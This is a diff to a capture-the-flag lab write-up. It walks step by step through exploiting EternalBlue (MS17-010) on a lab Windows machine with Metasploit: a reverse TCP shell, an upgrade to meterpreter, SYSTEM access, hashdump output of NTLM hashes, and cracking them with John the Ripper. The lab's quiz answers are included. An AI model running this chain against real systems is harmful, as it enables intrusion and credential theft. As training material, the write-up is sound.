@@ -71,10 +71,68 @@ Interact with a module by name or index. For example info 4, use 4 or use exploi
 ```
 3. Question `Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)` Ansswer `exploit/windows/smb/ms17_010_eternalblue`
 4. To use the exploit we typed `use exploit/windows/smb/ms17_010_eternalblue` command
-5. After checkinh options with `options` command, we found that we need to add rhosts with `set rhosts 10.10.248.180` command
+5. After checkinh options with `options` command, we found that we need to add rhosts with `set rhosts 10.10.248.180` and `set lhost tun0` command
 6. Question `Show options and set the one required value. What is the name of this value? (All caps for submission)` Answer `RHOSTS`
 7. Used payload with command `set payload windows/x64/shell/reverse_tcp`
-8. 
+8. Then `run` and wait for some time.
+9. `search shell_to_meterpreter` to find module to upgrade session to meterpreter.
+Output:
+```bash
+Matching Modules
+================
 
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
+```
+10. Question `If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)` Answer `post/multi/manage/shell_to_meterpreter`
+11. Question `Select this (use MODULE_PATH). Show options, what option are we required to change?` Answer `SESSION`
+12. Run the module after setting session. If fails run it again, it will connect.
+```bash
+meterpreter > shell
+Process 808 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>ps
+ps
+'ps' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Windows\system32>exit
+exit
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System             x64   0
+ 416   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM  ...........
+...............................................................................
+...............................................................................
+```
+13. Use `migrate PROCESS_ID` to mmigrate.
+14. Use `hashdump` to hashes.
+Output:
+```bash
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+```
+16. Question `Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?` Answer `Jon`
+17. Save hashes in a file named `hash.txt` and use `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` to crack the hash.
+18. 
 
 Author: Zishan Ahamed Thandar
